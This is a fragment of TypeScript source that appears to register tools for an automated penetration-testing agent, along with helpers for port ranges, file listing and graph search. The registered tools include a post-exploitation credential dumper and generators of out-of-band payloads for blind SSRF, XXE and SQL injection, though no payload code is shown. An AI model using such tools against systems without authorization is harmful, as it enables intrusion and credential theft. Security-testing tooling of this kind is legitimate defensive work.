  tags: ['exploit', 'credentials', 'dump', 'post-exploitation'],
  factory: () => createCredDumpTool(),
});

// ── OOB Detection Tools ──

toolRegistry.register({
  name: 'oob_trigger',
  category: 'exploit',
  description: 'Generate OOB (Out-of-Band) payloads for blind SSRF, XXE, SQLi via callback server',
  tags: ['oob', 'blind', 'ssrf', 'xxe', 'sqli', 'callback'],
  factory: () => {
    const server = new OOBServer();
    server.start().catch(() => {});
    return createOOBTriggerTool(server);
  },
});

toolRegistry.register({
  name: 'oob_find',
  category: 'exploit',
  description: 'Check OOB callback server for incoming callbacks to confirm blind SSRF, XXE, or SQLi',
  tags: ['oob', 'blind', 'callback', 'detection', 'verification'],
  factory: () => createOOBFindTool(new OOBServer()),
});

// ── Flow Mapping Tools ──

toolRegistry.register({
  name: 'build_flow_from_trace',
  category: 'recon',
  description: 'Automatically build app flow model from captured network trace. Start browser_start_trace, navigate the app, stop trace, then call this. Generates flow.yaml, flow.json, session.har, and Playwright tests.',
  tags: ['flow', 'mapping', 'trace', 'artifact'],
  factory: () => createBuildFlowFromTraceTool(),
});

// ── Helpers ──

function parseRange(range?: string): number[] | undefined {
  if (!range) return undefined;
  const [start, end] = range.split('-').map(Number);
  if (isNaN(start) || isNaN(end)) return undefined;
  const ports: number[] = [];
  for (let i = start; i <= end && i <= 1024; i++) ports.push(i);
  return ports;
}

function getAllFiles(dir: string): string[] {
  const fs = require('fs');
  const path = require('path');
  const files: string[] = [];
  if (!fs.existsSync(dir)) return files;
  const stat = fs.statSync(dir);
  if (stat.isFile()) return [dir];
  for (const entry of fs.readdirSync(dir)) {
    const fullPath = path.join(dir, entry);
    if (entry === 'node_modules' || entry === '.git' || entry === 'dist') continue;
    const entryStat = fs.statSync(fullPath);
    if (entryStat.isDirectory()) files.push(...getAllFiles(fullPath));
    else if (/\.(js|ts|jsx|tsx|py|rb|go|java|php|cs)$/.test(entry)) files.push(fullPath);
  }
  return files;
}

function bfsReach(graph: Array<{ from: string; to: string }>, start: string, target: string): Array<{ from: string; to: string }> | null {
  const visited = new Set<string>();
  const queue: Array<{ node: string; path: Array<{ from: string; to: string }> }> = [{ node: start, path: [] }];
  while (queue.length > 0) {
    const { node, path } = queue.shift()!;
    if (node === target) return path;
    if (visited.has(node)) continue;
    visited.add(node);
    for (const edge of graph) {
      if (edge.from === node && !visited.has(edge.to)) {
        queue.push({ node: edge.to, path: [...path, edge] });
      }
    }
  }
  return null;
}
